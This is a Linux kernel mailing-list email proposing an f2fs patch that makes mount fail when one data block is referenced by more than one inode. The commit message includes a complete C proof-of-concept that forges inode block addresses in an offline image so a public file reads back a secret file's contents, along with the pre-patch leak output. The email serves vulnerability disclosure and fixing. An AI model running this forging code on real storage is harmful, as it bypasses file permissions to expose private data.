Return-Path: <linux-f2fs-devel-bounces@lists.sourceforge.net>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 513F6CCA46C
	for <linux-f2fs-devel@archiver.kernel.org>; Fri, 16 Oct 2026 14:33:12 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Transfer-Encoding:Content-Type:Cc:
	List-Subscribe:List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:
	Subject:Date:To:From:MIME-Version:Message-ID:Sender:Reply-To:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=Zb7GCX43qLhwPiYolpeL3sh2CiNsvfFGTRvjJZ5cPEo=; b=kjW58cK76rb3MCLLIfeactGfaF
	tZbKo1y7xYs2SbCZNRgVJWghK+WuHgtgATjBCy2KlyYvE/7KY+Lo8vRryhxPVaHuebcZS5kXA7aiq
	l1Hxtk7ZJnjXL+X5ykYyljw8FOq3fEYgnd0eI/nDec95jrcYqUB+jQkXillYRgnNkgiE=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <linux-f2fs-devel-bounces@lists.sourceforge.net>)
	id 1xHize-0003mX-39;
	Fri, 16 Oct 2026 14:33:10 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <haoranwangsec@gmail.com>) id 1xHizc-0003mR-Fr
 for linux-f2fs-devel@lists.sourceforge.net;
 Fri, 16 Oct 2026 14:33:09 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Date:Cc:To:From:Content-Transfer-Encoding:
 MIME-Version:Content-Type:Message-ID:Sender:Reply-To:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=nP380LbTp7C0UW/dwpixrIfpHtVd4BaQcoJzTHtWMcs=; b=VAZywayUP9x096l09HHVJcL86H
 NMPSic04b40VvQghVIfh/HvkYpMl1QTIx85ghg88PBee7xFNk5Rb88iUfnSxzmjT24y3Hp5q15GZv
 /NhBa2HGE90OFERI8ZfDDchpgP9nl7pjS3qxXtyXqF9Q4UXyz2Xf1YSZEfg92ECsI754=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Date:Cc:To:From:Content-Transfer-Encoding:MIME-Version:
 Content-Type:Message-ID:Sender:Reply-To:Content-ID:Content-Description:
 Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
 In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=nP380LbTp7C0UW/dwpixrIfpHtVd4BaQcoJzTHtWMcs=; b=NhN/GNfgCsDquSNXEovPpDCFVI
 Zi8T2Caw8y9muunGtKVXMvaCeZ6HfVcxI3M/hCh1EJLQDC63G9bmpBtONvZJCIood5hsxvEeRwsOC
 7rclVof9FN0XIqesxtgB3XbEh0bFdYRfjECI4gQGPgP0kCjrmEX4ABhAqc0J7/TLc9dI=;
Received: from mail-pg1-f169.google.com ([209.85.215.169])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1xHizc-0008Tq-4T for linux-f2fs-devel@lists.sourceforge.net;
 Fri, 16 Oct 2026 14:33:09 +0000
Received: by mail-pg1-f169.google.com with SMTP id
 41be03b00d2f7-cd5e6f0a22bso13180a12.1
 for <linux-f2fs-devel@lists.sourceforge.net>;
 Fri, 16 Oct 2026 07:33:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=gmail.com; s=20251104; t=1792161182; x=1792765982; darn=lists.sourceforge.net;
 h=subject:date:cc:to:from:content-transfer-encoding:mime-version
 :content-type:message-id:from:to:cc:subject:date:message-id:reply-to
 :content-type; bh=nP380LbTp7C0UW/dwpixrIfpHtVd4BaQcoJzTHtWMcs=;
 b=O7ENoOCBLTrlE6pPfco3cZPxVSC+NhIaIRRbqTOrc5oCsR2F8ppUF29tDZP28yMrwy
 NAOoykQ6K49e9yGdTQZNANag8+OS/Kk6MeRa6nH6PGj7CAVWRETWV+wZVzHNLf6s6w/N
 RPvmUbUsqoC8NanOMXeI4UAQeW+xtiddLrx8rsW8MeqHXZ3XQSHktN/XX6Igg7V7MGlW
 FfdTjblfBqXQRWZcxsi2OM6HyPJ4b3sTY0lBzS1D/h8z11SA3JsE9BXd/iOxVZ0AJnLN
 BF91TT3pCsB76RsAFrf3Y8UwK/36lwG+JO+0ZYteZI6VjVqefTGX0ZBYDDF+XAWbaxAa
 d/Kg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20260707; t=1792161182; x=1792765982;
 h=subject:date:cc:to:from:content-transfer-encoding:mime-version
 :content-type:message-id:x-gm-gg:x-gm-message-state:from:to:cc
 :subject:date:message-id:reply-to:content-type;
 bh=nP380LbTp7C0UW/dwpixrIfpHtVd4BaQcoJzTHtWMcs=;
 b=R9xGQ0D+Gp0bfBWqk3kGln/U3nLDLTBH/TQn7k1gXUUJf/UO5bX2qCwVZn9Wv814Im
 jDltYQMEppc5bqZQicJUQ4Tkpz8bbAUkLmU0wVRHLuGQJ2WnECZdmrwZiTesqpjNLN4D
 2eGYsHTCFBUI2St1gwf+M/8bx8HnXB8ku64oMYZC39dMD5YIEJmVbPcBaJPyw+cPug2n
 vvohlEKLe8Q9GCfdR/3I4k1+Qbxd6WZPLSflcjKJcqvInCFqR2Hqf1jJpwdnerOGGnGl
 UvPu7ocjHNbOsP3k92FKFsM4HeL+Y4ZtSwY3U2uaEFNbIxwTgjuMKjNB17lL8bnCpYf3
 82mw==
X-Gm-Message-State: AFq9FYLUsxBcuIzJ2aZkNnv64DI7UJE7qBFk9FGB6Ix638dwRxZWyU9a
 EDgxYtXo8cAb1ecopIv3C7Nz/zGwWhcNzMV29+bEgQhH8KUlGzbwoNxu6BQvpw==
X-Gm-Gg: AYBFou01cQ8zGSjS3HYlRWX40JfTKplaSCA5rColrRWtm6No9MU4DK+eIsd8KqHnCCg
 dCr1wda6KCsDvMG3UJIu0HT1UnpdYaC0hEGTlL0vuAEKiiAibAgmGBe85amVVRfCxmNWwEEDoi3
 r+nW1RK4hBKR7Z3XmUZY4EoBLnuZxdWUq10TCvcF8Rx/dyI8zfpoR1kgB9exwNZHNNpEKqib3sW
 O4Mc21hedMce6GUqcKAS+YxwQxDpzeHivISCi78s6qmJiwQhuy5GRQZLbHwCz44Nog8ehyjuCAg
 GzsmULt+r3YDc+lNn820nu9QpzDW67hWBJ72ZT6abhxjjpGzUG6jM2Dvg8Mp3I9zpGAFtoenXpM
 Nk690gJDTiXIq+0E1/USBTsP31MRm8B7faFDr8zxc1H0/VrlN43jltPQIgVlzemVyYM2LCXRRDj
 YCA9Mbc/DdRjrgKSp/QSPDGU4HvjZDJjmyaJBSGsEMFvPjU41AKt9FMTVlEXheWiL32ax+8tBD8
 XgYvw==
X-Received: by 2002:a17:90b:1a85:b0:3a7:b260:9ced with SMTP id
 98e67ed59e1d1-3acef5ae3f8mr3506a91.58.1792161182317; 
 Fri, 16 Oct 2026 07:33:02 -0700 (PDT)
Received: from [58.206.202.11] ([104.28.247.69])
 by smtp.gmail.com with ESMTPSA id
 98e67ed59e1d1-3ac943e7548sm9665214a91.1.2026.10.16.07.32.59
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Fri, 16 Oct 2026 07:33:01 -0700 (PDT)
Message-ID: <6ad2359d.0083e9c2.97e0f.79de@mx.google.com>
MIME-Version: 1.0
From: Haoran Wang <haoranwangsec@gmail.com>
To: jaegeuk@kernel.org, chao@kernel.org
Date: Fri, 16 Oct 2026 22:32:58 +0800
X-Headers-End: 1xHizc-0008Tq-4T
Subject: [f2fs-dev] [PATCH] f2fs: verify inode data-block ownership at mount
X-BeenThere: linux-f2fs-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <linux-f2fs-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux-f2fs-devel>, 
 <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux-f2fs-devel>
List-Post: <mailto:linux-f2fs-devel@lists.sourceforge.net>
List-Help: <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel>, 
 <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=subscribe>
Cc: haoranwangsec@gmail.com, linux-kernel@vger.kernel.org,
 linux-f2fs-devel@lists.sourceforge.net
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: linux-f2fs-devel-bounces@lists.sourceforge.net

From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
From: Haoran Wang <haoranwangsec@gmail.com>
Subject: [PATCH] f2fs: verify inode data-block ownership at mount

\
f2fs resolves a file's logical offsets to data blocks through on-disk
inode metadata but never checks that a data block claimed by one inode is
not also claimed by another.  With offline write access to the block
device an attacker can forge a regular inode's i_addr so that a
world-readable file reads back a different file's data blocks, leaking
its contents across the permission boundary once the image is mounted.

PoC (forge.c, pre-patch; default mkfs.f2fs image, feature 0x00000000,
inode_checksum off):

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#define BLK 4096
#define FO (BLK - 24)        /* 4072: node footer offset within block */
#define SB 1024              /* superblock offset in the image */

static uint8_t *data;
static off_t len;

static uint16_t rd16(off_t o) { return data[o] | (data[o + 1] << 8); }
static uint32_t rd32(off_t o) {
    return data[o] | (data[o + 1] << 8) | (data[o + 2] << 16) | (data[o + 3] << 24);
}
static uint64_t rd64(off_t o) {
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v |= (uint64_t)data[o + i] << (8 * i);
    return v;
}
static void wr32(off_t o, uint32_t v) {
    data[o] = v; data[o + 1] = v >> 8; data[o + 2] = v >> 16; data[o + 3] = v >> 24;
}
static void wr64(off_t o, uint64_t v) {
    for (int i = 0; i < 8; i++) data[o + i] = v >> (8 * i);
}

struct finfo {
    off_t off;
    uint64_t size;
    int inl;
    uint32_t ext_blk, ext_len, addrs[16];
    uint8_t i_inline;
};

static int find(const char *name, struct finfo *f)
{
    uint32_t main = rd32(SB + 96);
    uint32_t end = main + 16384;
    if ((off_t)end > len / BLK)
        end = len / BLK;
    for (uint32_t blk = main; blk < end; blk++) {
        off_t off = (off_t)blk * BLK;
        if (off + BLK > len)
            break;
        uint32_t nid = rd32(off + FO);
        uint32_t ino = rd32(off + FO + 4);
        if (nid != ino || nid < 1)
            continue;
        uint16_t mode = rd16(off);
        if ((mode & 0xF000) == 0x4000)    /* directory */
            continue;
        char nm[256];
        memcpy(nm, data + off + 92, 255);
        nm[255] = 0;
        if (strcmp(nm, name) != 0)
            continue;
        f->off = off;
        f->i_inline = data[off + 3];
        f->size = rd64(off + 16);
        f->ext_blk = rd32(off + 352);
        f->ext_len = rd32(off + 356);
        for (int j = 0; j < 16; j++)
            f->addrs[j] = rd32(off + 360 + j * 4);
        f->inl = f->i_inline & 0x02;
        return 0;
    }
    return -1;
}

static void do_forge(struct finfo *s, struct finfo *t)
{
    if (s->inl) {
        memcpy(data + t->off + 360, data + s->off + 360, 3688);
        data[t->off + 3] |= 0x02 | 0x08;
        wr64(t->off + 16, s->size);
    } else {
        wr32(t->off + 352, s->ext_blk);
        wr32(t->off + 356, s->ext_len);
        for (int j = 0; j < 16; j++)
            if (s->addrs[j])
                wr32(t->off + 360 + j * 4, s->addrs[j]);
        wr64(t->off + 16, s->size);
        data[t->off + 3] &= ~0x02;
    }
}

static ssize_t read_all(int fd, uint8_t *buf, off_t n)
{
    off_t got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, n - got);
        if (r < 0) return -1;
        if (r == 0) break;
        got += r;
    }
    return got;
}

static ssize_t write_all(int fd, const uint8_t *buf, off_t n)
{
    off_t put = 0;
    while (put < n) {
        ssize_t r = write(fd, buf + put, n - put);
        if (r < 0) return -1;
        put += r;
    }
    return put;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <image>\n", argv[0]);
        return 2;
    }
    int fd = open(argv[1], O_RDWR);
    if (fd < 0) { perror("open"); return 2; }
    struct stat st;
    if (fstat(fd, &st)) { perror("fstat"); return 2; }
    len = st.st_size;
    data = malloc(len);
    if (!data) { perror("malloc"); return 2; }
    if (read_all(fd, data, len) != len) { perror("read"); return 2; }

    struct finfo s, t;
    if (find("secret", &s)) { printf("forge: secret not found\n"); return 1; }
    if (find("public", &t)) { printf("forge: public not found\n"); return 1; }
    printf("secret: off=%lld inline=%d size=%llu ext_blk=%u ext_len=%u\n",
        (long long)s.off, s.inl, (unsigned long long)s.size,
        s.ext_blk, s.ext_len);
    printf("public: off=%lld inline=%d size=%llu\n",
        (long long)t.off, t.inl, (unsigned long long)t.size);

    do_forge(&s, &t);

    if (lseek(fd, 0, SEEK_SET) < 0) { perror("lseek"); return 2; }
    if (write_all(fd, data, len) != len) { perror("write"); return 2; }
    printf("forge: public -> secret (%s) done\n", s.inl ? "inline" : "extent");
    free(data);
    close(fd);
    return 0;
}

Pre-patch result:

  forge: public -> secret (extent) done
  $ cat /mnt/public
  SECRET_EXT_99999
  RESULT: LEAK -- SECRET_EXT readable via public (vuln present)

Add a mount-time scan that, for every regular, non-inline-data,
non-inline-dentry, non-compressed inode in the main area, records each
direct data address in i_addr[base..end) into a per-block bitmap --
skipping the extra-attr region (base) and the inline-xattr tail (end)
where present.  f2fs never intentionally shares data blocks between
inodes, so an address already claimed by another inode is unambiguous
corruption: the mount fails with -EFSCORRUPTED instead of exposing the
stale data.  The check runs after f2fs_build_gc_manager() and unwinds
through the existing free_nm path on failure.

Inline-data files carry no separate data block and so are outside the
scope of this ownership check.

Signed-off-by: Haoran Wang <haoranwangsec@gmail.com>
---
 fs/f2fs/f2fs.h  |    1 +
 fs/f2fs/node.c  |   79 +++++++++++++++++++++++++++++++++++++++++++++++++++++
 fs/f2fs/super.c |    6 ++++++
 3 files changed, 86 insertions(+)

diff --git a/fs/f2fs/f2fs.h b/fs/f2fs/f2fs.h
--- a/fs/f2fs/f2fs.h
+++ b/fs/f2fs/f2fs.h
@@ -3978,6 +3978,7 @@
 bool f2fs_need_inode_block_update(struct f2fs_sb_info *sbi, nid_t ino);
 int f2fs_get_node_info(struct f2fs_sb_info *sbi, nid_t nid,
 				struct node_info *ni, bool checkpoint_context);
+int f2fs_verify_inode_data_ownership(struct f2fs_sb_info *sbi);
 pgoff_t f2fs_get_next_page_offset(struct dnode_of_data *dn, pgoff_t pgofs);
 int f2fs_get_dnode_of_data(struct dnode_of_data *dn, pgoff_t index, int mode);
 int f2fs_truncate_inode_blocks(struct inode *inode, pgoff_t from);

diff --git a/fs/f2fs/node.c b/fs/f2fs/node.c
--- a/fs/f2fs/node.c
+++ b/fs/f2fs/node.c
@@ -6,6 +6,7 @@
  *             http://www.samsung.com/
  */
 #include <linux/fs.h>
+#include <linux/buffer_head.h>
 #include <linux/f2fs_fs.h>
 #include <linux/mpage.h>
 #include <linux/sched/mm.h>

diff --git a/fs/f2fs/node.c b/fs/f2fs/node.c
--- a/fs/f2fs/node.c
+++ b/fs/f2fs/node.c
@@ -3445,6 +3446,84 @@
 	return 0;
 }
 
+static int f2fs_claim_data_addr(unsigned long *claimed, block_t main_b,
+		block_t total, block_t blkaddr)
+{
+	if (blkaddr == NULL_ADDR || blkaddr == NEW_ADDR)
+		return 0;
+	if (blkaddr < main_b || blkaddr >= total)
+		return 0;
+	if (test_and_set_bit(blkaddr, claimed))
+		return -EFSCORRUPTED;
+	return 0;
+}
+
+int f2fs_verify_inode_data_ownership(struct f2fs_sb_info *sbi)
+{
+	struct f2fs_super_block *raw = F2FS_RAW_SUPER(sbi);
+	block_t main_b = le32_to_cpu(raw->main_blkaddr);
+	block_t total = le64_to_cpu(raw->block_count);
+	unsigned long *claimed;
+	struct buffer_head *bh = NULL;
+	block_t blk;
+	int err = 0;
+
+	claimed = kvzalloc_objs(unsigned long, BITS_TO_LONGS(total));
+	if (!claimed)
+		return -ENOMEM;
+
+	for (blk = main_b; blk < total; blk++) {
+		struct f2fs_node *fn;
+		struct f2fs_inode *ri;
+		nid_t nid, ino;
+		int base, end, i;
+
+		bh = sb_bread(sbi->sb, blk);
+		if (!bh) {
+			err = -EIO;
+			break;
+		}
+		fn = (struct f2fs_node *)bh->b_data;
+		nid = le32_to_cpu(fn->footer.nid);
+		ino = le32_to_cpu(fn->footer.ino);
+		if (nid != ino || !nid)
+			goto next;
+		ri = &fn->i;
+		if (!S_ISREG(le16_to_cpu(ri->i_mode)))
+			goto next;
+		if (ri->i_inline & (F2FS_INLINE_DATA | F2FS_INLINE_DENTRY))
+			goto next;
+		if (le32_to_cpu(ri->i_flags) & F2FS_COMPR_FL)
+			goto next;
+		base = (ri->i_inline & F2FS_EXTRA_ATTR)
+			? le16_to_cpu(ri->i_extra_isize) / 4 : 0;
+		end = DEF_ADDRS_PER_INODE;
+		if (ri->i_inline & F2FS_INLINE_XATTR) {
+			if (f2fs_sb_has_flexible_inline_xattr(sbi) &&
+				(ri->i_inline & F2FS_EXTRA_ATTR))
+				end -= le16_to_cpu(ri->i_inline_xattr_size);
+			else
+				end -= DEFAULT_INLINE_XATTR_ADDRS;
+		}
+		if (base > end || end > DEF_ADDRS_PER_INODE)
+			goto next;
+		for (i = base; i < end; i++) {
+			err = f2fs_claim_data_addr(claimed, main_b, total,
+				le32_to_cpu(ri->i_addr[i]));
+			if (err)
+				goto out;
+		}
+next:
+		brelse(bh);
+		bh = NULL;
+	}
+out:
+	if (bh)
+		brelse(bh);
+	kvfree(claimed);
+	return err;
+}
+
 int f2fs_build_node_manager(struct f2fs_sb_info *sbi)
 {
 	int err;
 
diff --git a/fs/f2fs/super.c b/fs/f2fs/super.c
--- a/fs/f2fs/super.c
+++ b/fs/f2fs/super.c
@@ -5261,6 +5261,12 @@
 
 	f2fs_build_gc_manager(sbi);
 
+	err = f2fs_verify_inode_data_ownership(sbi);
+	if (err) {
+		f2fs_err(sbi, "data block referenced by multiple inodes");
+		goto free_nm;
+	}
+
 	err = f2fs_build_stats(sbi);
 	if (err)
 		goto free_nm;
-- 
2.43.0

_______________________________________________
Linux-f2fs-devel mailing list
Linux-f2fs-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel
